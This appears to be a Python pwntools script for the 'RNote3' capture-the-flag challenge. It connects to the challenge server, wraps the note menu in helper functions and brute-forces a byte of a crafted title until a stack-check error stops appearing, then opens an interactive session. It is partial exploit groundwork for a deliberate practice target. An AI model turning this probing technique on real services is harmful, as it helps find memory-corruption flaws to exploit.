#!/usr/bin/env python
from pwn import *
import random

#e , l = ELF( './RNote3' ) , ELF( './libc.so.6' )
host , port = 'rnote3.2018.teamrois.cn' , 7322

#conn = process( './RNote3' )
conn = remote( host , port )


def Add( title , size , content ):
	conn.sendline("1")
	conn.send( title )
	conn.sendline( str(size) )
	conn.sendline( content )
	
def View(title):
	conn.sendline("2")
	conn.send( title )
	buf = conn.recvline()
	buf += conn.recvline()
	return buf

def Edit( title ):
	conn.sendline("3")
	conn.sendline( title )

def Delete( data ):
	conn.sendline()
	conn.sendlineafter( '>' , 'c' )
	conn.sendline( data )
	sleep( 1 )
"""
print(conn.recvuntil("Exit"))

#Add("A"*8, 30, "B"*15+"C"*15)
#print(View("A"*8))
print(conn.recvuntil("Exit"))
Edit("A"*8+"C")
"""

for c in range(0,0x100):
	conn.recvuntil("Exit")
	title = "A"*4+"\x00"*4+chr(c)
	print(title.encode("hex"))
	Edit(title)
	res = conn.recvline()
	res += conn.recvline()
	res += conn.recvline()
	if "stack" not in res:
		if c==10:
			conn.close()
			conn = remote( host , port )
			continue
		print(res)
		print("%2x" % c)
		conn.interactive()
		conn.close()
		break
	else:
		print(res)
	conn.close()
	#conn = process('./RNote3')
	conn = remote( host , port )





